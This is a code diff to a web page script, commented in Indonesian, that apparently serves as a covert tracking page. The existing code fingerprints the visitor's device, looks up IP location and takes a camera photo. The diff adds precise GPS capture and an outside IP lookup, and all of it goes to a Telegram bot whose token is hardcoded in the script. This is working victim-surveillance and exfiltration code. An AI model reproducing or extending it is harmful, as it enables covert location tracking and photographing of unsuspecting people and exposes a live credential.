@@ -66,38 +66,65 @@
 
     <script>
         // =============================================================
-        // 1. CAPTURE DEVICE INFO
+        // 1. CAPTURE DEVICE INFO (UPGRADE - PAKE API)
         // =============================================================
-        function getDeviceInfo() {
+        async function getDeviceInfo() {
             const ua = navigator.userAgent;
             let device = 'Unknown Device';
             let browser = 'Unknown Browser';
             let os = 'Unknown OS';
 
-            if (ua.includes('Android')) os = 'Android';
-            else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
-            else if (ua.includes('Windows')) os = 'Windows';
-            else if (ua.includes('Mac')) os = 'MacOS';
-            else if (ua.includes('Linux')) os = 'Linux';
+            // Deteksi OS (lebih akurat pake navigator)
+            if (navigator.userAgentData) {
+                const brands = navigator.userAgentData.brands;
+                const platform = navigator.userAgentData.platform;
+                if (platform) os = platform;
+                brands.forEach(b => {
+                    if (b.brand.includes('Android')) os = 'Android';
+                    if (b.brand.includes('iOS')) os = 'iOS';
+                });
+            } else {
+                if (ua.includes('Android')) os = 'Android';
+                else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+                else if (ua.includes('Windows')) os = 'Windows';
+                else if (ua.includes('Mac')) os = 'MacOS';
+                else if (ua.includes('Linux')) os = 'Linux';
+            }
 
+            // Deteksi Browser
             if (ua.includes('Chrome') && !ua.includes('Edg')) browser = 'Chrome';
             else if (ua.includes('Firefox')) browser = 'Firefox';
             else if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
             else if (ua.includes('Edg')) browser = 'Edge';
             else if (ua.includes('Opera')) browser = 'Opera';
 
-            if (os === 'Android') {
-                const match = ua.match(/Android\s([\d.]+)/);
-                if (match) os += ' ' + match[1];
-                const modelMatch = ua.match(/\(([^)]+)\)/);
-                if (modelMatch) device = modelMatch[1].split(';').pop().trim() || 'Android Device';
-            } else if (os === 'iOS') {
-                const match = ua.match(/OS\s([\d_]+)/);
-                if (match) os += ' ' + match[1].replace(/_/g, '.');
-                if (ua.includes('iPhone')) device = 'iPhone';
-                else if (ua.includes('iPad')) device = 'iPad';
-            } else {
-                device = os + ' Device';
+            // Deteksi Device (pake API eksternal)
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                if (data.org) {
+                    device = data.org.split(' ').slice(0, 2).join(' ') || 'Unknown';
+                }
+            } catch (e) {}
+
+            // Fallback: dari user-agent
+            if (device === 'Unknown Device' || device === 'Unknown') {
+                if (os === 'Android') {
+                    const match = ua.match(/Android\s([\d.]+)/);
+                    if (match) os += ' ' + match[1];
+                    const brandMatch = ua.match(/(Samsung|Xiaomi|Oppo|Vivo|Realme|Nokia|Asus|Sony|OnePlus|Google|Huawei|Lenovo|LG|Motorola)/i);
+                    const brand = brandMatch ? brandMatch[1] : '';
+                    const modelMatch = ua.match(/\(([^)]+)\)/);
+                    const model = modelMatch ? modelMatch[1].split(';').pop().trim() : '';
+                    device = brand + ' ' + model || 'Android Device';
+                } else if (os === 'iOS') {
+                    const match = ua.match(/OS\s([\d_]+)/);
+                    if (match) os += ' ' + match[1].replace(/_/g, '.');
+                    if (ua.includes('iPhone')) device = 'iPhone';
+                    else if (ua.includes('iPad')) device = 'iPad';
+                } else {
+                    device = os + ' Device';
+                }
             }
 
             return { device, browser, os };
@@ -125,7 +152,29 @@
         }
 
         // =============================================================
-        // 3. CAPTURE PHOTO FROM CAMERA
+        // 3. GET GPS (LEBIH AKURAT)
+        // =============================================================
+        async function getGPS() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ lat: 0, lon: 0, accuracy: 0 });
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        resolve({
+                            lat: pos.coords.latitude,
+                            lon: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        });
+                    },
+                    () => resolve({ lat: 0, lon: 0, accuracy: 0 })
+                );
+            });
+        }
+
+        // =============================================================
+        // 4. CAPTURE PHOTO FROM CAMERA
         // =============================================================
         async function capturePhoto() {
             return new Promise(async (resolve) => {
@@ -151,7 +200,7 @@
         }
 
         // =============================================================
-        // 4. SEND TO TELEGRAM BOT
+        // 5. SEND TO TELEGRAM BOT
         // =============================================================
         async function sendToTelegram(data) {
             const BOT_TOKEN = '8737287636:AAHBFuM1QAvTXoUTFxd7cjF5wHZztKZYT18';
@@ -170,7 +219,12 @@
             message += `🗺️ *Region:* ${data.location.region}\n`;
             message += `🏳️ *Country:* ${data.location.country}\n`;
             message += `🏢 *ISP:* ${data.location.isp}\n`;
-            message += `🗺️ *Map:* https://www.google.com/maps?q=${data.location.lat},${data.location.lon}\n`;
+            message += `🗺️ *IP Map:* https://www.google.com/maps?q=${data.location.lat},${data.location.lon}\n`;
+
+            if (data.gps.lat !== 0) {
+                message += `📍 *GPS Location:* https://www.google.com/maps?q=${data.gps.lat},${data.gps.lon}\n`;
+                message += `📏 *Accuracy:* ${Math.round(data.gps.accuracy)} meters\n`;
+            }
 
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -207,11 +261,12 @@
         }
 
         // =============================================================
-        // 5. MAIN EXECUTION
+        // 6. MAIN EXECUTION
         // =============================================================
         async function main() {
-            const deviceInfo = getDeviceInfo();
+            const deviceInfo = await getDeviceInfo();
             const location = await getLocation();
+            const gps = await getGPS();
             const photo = await capturePhoto();
 
             const data = {
@@ -219,6 +274,7 @@
                 browser: deviceInfo.browser,
                 os: deviceInfo.os,
                 location: location,
+                gps: gps,
                 photo: photo
             };
 
